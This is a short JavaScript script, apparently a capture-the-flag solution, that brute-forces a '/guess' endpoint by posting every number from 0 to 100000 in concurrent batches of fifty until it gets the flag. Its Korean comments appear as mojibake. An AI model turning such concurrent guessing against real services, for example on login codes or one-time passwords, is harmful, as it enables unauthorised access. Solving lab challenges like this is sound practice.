const maxNumber = 100000;   // ìˆ«ì ìµœëŒ€ê°’
const concurrency = 50;      // ë™ì‹œì— ìš”ì²­ ë³´ë‚¼ ê°œìˆ˜

let found = false;           // flag ì°¾ì•˜ëŠ”ì§€ ì—¬ë¶€

async function tryNumber(n) {
    if (found) return;
    const formData = new FormData();
    formData.append('guess', n);

    try {
        const response = await fetch('/guess', { method: 'POST', body: formData });
        const result = await response.json();
        if (result.result === 'Correct') {
            found = true;
            console.log(`ğŸ‰ FLAG FOUND! Number: ${n}, Flag: ${result.flag}`);
        }
    } catch (err) {
        // ì˜¤ë¥˜ëŠ” ë¬´ì‹œ
    }
}

async function bruteForce() {
    let promises = [];
    for (let i = 0; i <= maxNumber; i++) {
        if (found) break;
        promises.push(tryNumber(i));
        if (promises.length >= concurrency) {
            await Promise.all(promises);
            promises = [];
        }
    }
    // ë‚¨ì€ ìš”ì²­ ì²˜ë¦¬
    if (promises.length > 0) await Promise.all(promises);
    if (!found) console.log('ëª¨ë“  ìˆ«ìë¥¼ ì‹œë„í–ˆì§€ë§Œ flagë¥¼ ì°¾ì§€ ëª»í–ˆìŠµë‹ˆë‹¤.');
}

// ì‹¤í–‰
bruteForce();